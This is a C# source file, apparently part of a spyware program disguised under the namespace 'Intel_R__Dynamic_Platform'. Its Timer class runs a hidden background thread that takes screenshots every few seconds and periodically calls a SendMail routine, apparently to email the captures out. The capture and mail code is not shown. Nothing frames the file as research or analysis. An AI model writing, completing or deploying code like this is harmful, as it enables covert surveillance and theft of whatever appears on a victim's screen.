using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Intel_R__Dynamic_Platform
{
    class Timer
    {
        private static int timeCapture = 5000;
        private static int timeMail = 7000;
        private static int interval = 0;
        public static void StartTimer()
        {
            Thread thread = new Thread(() =>
            {
               
                while (true)
                {
                    Thread.Sleep(1);
                    if (interval % timeCapture == 0)
                    {
                        Capture.CaptureScreen();
                    }
                    if (interval % timeMail == 0)
                    {
                        if (Capture.imageCount > 10)
                        {
                           
                            //Capture.imageCount = 0;
                        }
                        else
                        {
                            Program.SendMail();
                        }

                    }
                    
                    
                    interval++;
                    if (interval > int.MaxValue - 10)
                    {
                        interval = 0;
                    }
                }

            });
            thread.IsBackground = true;
            thread.Start();
        }
    }
}
